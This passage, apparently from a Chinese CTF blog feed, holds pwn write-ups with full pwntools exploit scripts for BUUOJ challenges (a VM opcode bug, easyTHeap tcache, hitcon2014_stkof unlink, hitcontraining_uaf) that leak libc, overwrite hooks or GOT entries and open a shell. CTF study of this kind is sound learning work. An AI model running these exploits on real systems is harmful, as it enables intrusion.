class="string">&#x27;/home/yfy/pwn_tools/buu_libc/16-64/libc-2.23.so&#x27;</span></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">0</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> select == <span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26749</span>)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = gdb.debug(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 0x10: reg[high]=small  //也就是低八位</span></span><br><span class="line"><span class="comment"># 0x20: reg[high]=0</span></span><br><span class="line"><span class="comment"># 0x30: reg[high] = memory[reg[small]]</span></span><br><span class="line"><span class="comment"># 0x40: memory[reg[small]] = reg[high]</span></span><br><span class="line"><span class="comment"># 0x50: stack[desk] = reg[high]</span></span><br><span class="line"><span class="comment"># 0x60: reg[high] = stack[reg[13]]</span></span><br><span class="line"><span class="comment"># 0x70: reg[high] = reg[small] + reg[middle]</span></span><br><span class="line"><span class="comment"># 0x80: reg[high] = reg[middle] - reg[small]</span></span><br><span class="line"><span class="comment"># 0x90: reg[high] = reg[small] &amp; reg[middle]</span></span><br><span class="line"><span class="comment"># 0xa0: reg[high] = reg[small] | reg[middle]</span></span><br><span class="line"><span class="comment"># 0xb0: reg[high] = reg[small] ^ reg[middle]</span></span><br><span class="line"><span class="comment"># 0xc0: reg[high] = reg[middle] &lt;&lt; reg[small]</span></span><br><span class="line"><span class="comment"># 0xd0: reg[high] = (int)reg[middle] &gt;&gt; reg[small]</span></span><br><span class="line"><span class="comment"># 0xe0: running = 0 //结束循环</span></span><br><span class="line"><span class="comment"># 0xff: pritnf(reg[i])（1~15）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">desk,high,middle,small</span>):</span><br><span class="line">    op = desk&lt;&lt;<span class="number">24</span></span><br><span class="line">    op+= high &lt;&lt;<span class="number">16</span></span><br><span class="line">    op+= middle&lt;&lt;<span class="number">8</span></span><br><span class="line">    op+= small</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;PCPC: &#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;SP: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;CODE SIZE: &#x27;</span>,<span class="built_in">str</span>(<span class="number">21</span>))</span><br><span class="line">rl(<span class="string">&#x27;CODE: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">56</span>)) <span class="comment">#reg[0]=56</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[3]=reg[1]-reg[0]=-56</span></span><br><span class="line">sl(opcode(<span class="number">0x30</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>))  <span class="comment">#reg[7]=memory[-56]</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">55</span>)) <span class="comment">#reg[0]=56</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[3]=reg[1]-reg[0]=-55</span></span><br><span class="line">sl(opcode(<span class="number">0x30</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">3</span>))  <span class="comment">#reg[11]=memory[-55]</span></span><br><span class="line"><span class="comment"># reg[7] reg[8]---&gt;stdin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free_hook-stdin=0x1098-8=0x1090</span></span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)) <span class="comment">#reg[0]=1</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">12</span>)) <span class="comment">#reg[1]=12</span></span><br><span class="line">sl(opcode(<span class="number">0xc0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)) <span class="comment">#reg[2]=reg[0]&lt;&lt;reg[1]  --&gt;  1&lt;&lt;12 =0x1000</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x90</span>)) <span class="comment">#reg[0]=0x90</span></span><br><span class="line">sl(opcode(<span class="number">0x70</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">#reg[10]=reg[0]+reg[2] --&gt;0x1000+0x90=0x1090</span></span><br><span class="line">sl(opcode(<span class="number">0x70</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">10</span>))  <span class="comment">#reg[12]=reg[7]+reg[10] </span></span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>))  <span class="comment">#reg[0]=8</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>))  <span class="comment">#reg[1]=0</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[2]=reg[1]-reg[0]=-8</span></span><br><span class="line">sl(opcode(<span class="number">0x40</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">#memeory[reg[2]]=reg[12]</span></span><br><span class="line">sl(opcode(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">12</span>)) <span class="comment">#reg[5]=reg[10]+reg[12]</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>))  <span class="comment">#reg[0]=7sl(opcode(0x10,1,0,0))  #reg[1]=0</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[2]=reg[1]-reg[0]=-7</span></span><br><span class="line">sl(opcode(<span class="number">0x40</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">#memeory[reg[2]]=reg[11]</span></span><br><span class="line">sl(opcode(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;R7:&#x27;</span>)</span><br><span class="line">low=<span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;low&#x27;</span>,low)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;R11:&#x27;</span>)</span><br><span class="line">high=<span class="built_in">int</span>(p.recv(<span class="number">5</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;high&#x27;</span>,high)</span><br><span class="line"></span><br><span class="line">stdin=(high&lt;&lt;<span class="number">32</span>)+low</span><br><span class="line">libc_base=stdin-libc.sym[<span class="string">&#x27;stdin&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="后面的后面"><a href="#后面的后面" class="headerlink" title="后面的后面"></a>后面的后面</h1><h2 id="V-N2020-公开赛-easyTHeap"><a href="#V-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h2><p>我本地自己打有个\x0a 但是我edit用的是send,这是网上的脚本，我自己调了下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import sleep</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,29307)</span><br><span class="line">#io = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    io.sendlineafter(&#x27;choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size?&#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,con):</span><br><span class="line">    io.sendlineafter(&#x27;choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx?&#x27;,str(idx))</span><br><span class="line">    io.sendafter(&#x27;:&#x27;,con)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    io.sendlineafter(b&#x27;choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(b&#x27;idx?&#x27;,str(idx))</span><br><span class="line"></span><br><span class="line">def free(idx): </span><br><span class="line">    io.sendlineafter(b&#x27;choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(b&#x27;idx?&#x27;,str(idx))</span><br><span class="line"></span><br><span class="line">add(0x50)#1</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">heap = u64(io.recvuntil(&#x27;\n&#x27;,drop=True).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">add(0x50)#1</span><br><span class="line">edit(1,p64(heap-0x250))</span><br><span class="line">add(0x50)#2</span><br><span class="line">add(0x50)#3</span><br><span class="line">edit(3,b&#x27;\xff&#x27;*0x38)</span><br><span class="line">free(3)</span><br><span class="line">show(3)</span><br><span class="line">leak = u64(io.recvuntil(&#x27;\n&#x27;,drop=True).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - 0x3ebca0</span><br><span class="line">log.success(&#x27;libc_base:&#x27;+hex(libc_base))</span><br><span class="line">malloc_hook = libc_base+libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">log.success(&#x27;malloc_hook:&#x27;+hex(malloc_hook))</span><br><span class="line">realloc = libc_base+libc.sym[&#x27;__libc_realloc&#x27;]</span><br><span class="line">one = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">add(0x50)#4</span><br><span class="line">edit(4,b&#x27;\x00&#x27;*0x48+p64(malloc_hook-0x13))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line"># pause()</span><br><span class="line">add(0x20)#5</span><br><span class="line"></span><br><span class="line">edit(5,b&#x27;\x00&#x27;*(0x13-8)+p64(one)+p64(realloc+8))</span><br><span class="line"></span><br><span class="line">add(0x10)</span><br><span class="line">sleep(0.2)</span><br><span class="line"># io.sendline(&#x27;cat flag&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn堆—unlink</title>
      <link href="/posts/6324.html"/>
      <url>/posts/6324.html</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>就我自己的理解，unlink就是大概就是在unsortedbin中这样的双向链表中，在第一个堆中写入伪造的一个堆结构，溢出到第二个堆的prve_size，和size位时，改size的最后一位为0,这样free第二个堆时，会触发堆的合并机制，在改写第一个堆的内容是可以造成一个任意位置的读写</p><h2 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h2><p>下面是一个大佬总结的  <a href="https://blog.csdn.net/qq_41202237/article/details/108481889?ops_request_misc=%7B%22request_id%22:%22A3DE81C7-DA41-411F-98A6-2B758DB6C042%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=A3DE81C7-DA41-411F-98A6-2B758DB6C042&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108481889-null-null.142%5Ev100%5Epc_search_result_base8&utm_term=%E5%A5%BD%E5%A5%BD%E8%AF%B4%E8%AF%9D%E4%B9%8Bunlink&spm=1018.2226.3001.4187">大佬的文章</a></p><blockquote><p>检查1：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><p>可以看左图绿色框中的内容，上面绿色框中的内容是second_chunk的size大小，下面绿色框中的内容是hollk5的prev_size，这两个绿色框中的数值是需要相等的（忽略P标志位）。在wiki上我记得在基础部分有讲过，如果一个块属于空闲状态，那么相邻高地址块的prev_size为前一个块的大小</p><p>检查2：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><p>可以看左图蓝色框中的内容，这里是hollk5的size，hollk5的size的P标志位为0，代表着它前一个chunk(second_chunk)为空闲状态</p><p>检查3：检查前后被释放chunk的fd和bk</p><p>可以看左图红色框中的内容，这里是second_chunk的fd和bk。首先看fd，它指向的位置就是前一个被释放的块first_chunk，这里需要检查的是first_chunk的bk是否指向second_chunk的地址。再看second_chunk的bk，它指向的是后一个被释放的块third_chunk，这里需要检查的是third_chunk的fd是否指向second_chunk的地址</p></blockquote><h1 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h1><p>这是buu上的一个题目，也差不多是很多大佬在讲这个知识点例题</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002291.png" alt="1"></p><p>got表可以改</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002292.png" alt="2"></p><p>edit（自己命名的）这里的修改没有进行长度的检查，溢出什么的很方便</p><p>各个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">num,content</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">num</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br></pre></td></tr></table></figure><p>先申请4个堆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>) //</span><br><span class="line">add(<span class="number">0x80</span>) //伪造堆</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) //用来free进行合并的 必须<span class="number">0x80</span>才是unsortedbin</span><br><span class="line">add(<span class="number">0x30</span>) //放/<span class="built_in">bin</span>/sh\x00的 </span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002293.png" alt="3"></p><p>然后就是伪造和free</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>-<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>这里重点讲一下bss的位置是</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112002294.png" alt="4"></p><p>add函数中malloc时返回的地址的存放点</p><p>bss-0x18是第一个堆的返回地址放在的位置</p><p>bss-0x10是bss伪造堆写入数据地址（检查）</p><p>这样创建的三个堆就可以edit了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,27761)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#bss=0x6021C0</span></span><br><span class="line">bss=<span class="number">0x602140</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">num,content</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">num</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">    <span class="comment">#p.recvuntil(b&#x27;OK&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>-<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload2+=p64(free_got)+p64(puts_got)</span><br><span class="line"><span class="comment">#payload2+=p64(free_got)+b&#x27;\x7f&#x27;+b&#x27;d&#x27;*5</span></span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line">payload1=p64(puts_plt)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_addr=leak-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(system)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UAF漏洞（hitcontraining_uaf）</title>
      <link href="/posts/41088.html"/>
      <url>/posts/41088.html</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>学到这里感觉学的很乱，感觉什么都要去了解，但是什么都不是很了解，可能学到后面的点把这些知识点串起来就好了吧。</p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>use after free顾名思义就是在这个chunk被free后面进行利用</p><p>当一个chunk被free后，这个函数内部的数据不会马上清除，这些数据会被保留在原来的位置，然后这个chunk会被标记为free后，并且会根据chunk的大小被分到不同的bin中去，有（fastbin,unsorted bin,large bin….）这些bin就是以链表的形势把这些free后chunk链在一起</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>下面以buu上面的<a href="https://buuoj.cn/challenges#hitcontraining_uaf">hitcontraining_uaf</a>进行说明</p><p>这个题目应该在glibc2.23环境中运行，但是这个题目大部分环境都可以打，就没改了</p><p>检查保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001533.png" alt="2"></p><p>ida打开</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001534.png" alt="1"></p><p>函数运行的时候会进行菜单选择</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001535.png" alt="3"></p><p>这里的delete函数中<img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001536.png" alt="5"></p><p><strong>这里可以看到free掉函数后面没有把函数的指针置零</strong></p><p>因此这里存在漏洞</p><p>同时这个题目存在后门函数</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001537.png" alt="4"></p><p>先申请两个堆块</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001538.png" alt="6"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001539.png" alt="7"></p><p>这个时候再free掉</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001540.png" alt="8"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001541.png" alt="9"></p><p>free后面的bin</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202412112001542.png" 